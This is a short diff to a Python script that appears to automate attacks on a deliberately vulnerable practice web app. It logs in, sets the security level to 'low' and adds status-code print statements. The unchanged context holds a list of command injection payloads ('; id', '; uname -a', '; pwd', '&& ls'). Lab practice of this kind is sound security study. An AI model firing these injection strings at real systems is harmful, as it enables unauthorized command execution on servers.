@@ -45,7 +45,7 @@ def login_and_setup_security():
     soup = BeautifulSoup(response.text, 'html.parser')
     user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
     time.sleep(delay) 
-    
+    print("Login response status:", response.status_code)
     #response = session.get(security_url)
     data = {
         'security': 'low',
@@ -54,7 +54,8 @@ def login_and_setup_security():
     }
     session.post(security_url, data=data, headers=headers)
     time.sleep(delay) 
-
+    print("Security low mode response status:", response.status_code)
+    
 def command_injection_attack():
     commands = ["; id", "; uname -a","; pwd", "&& ls"]
     results = []
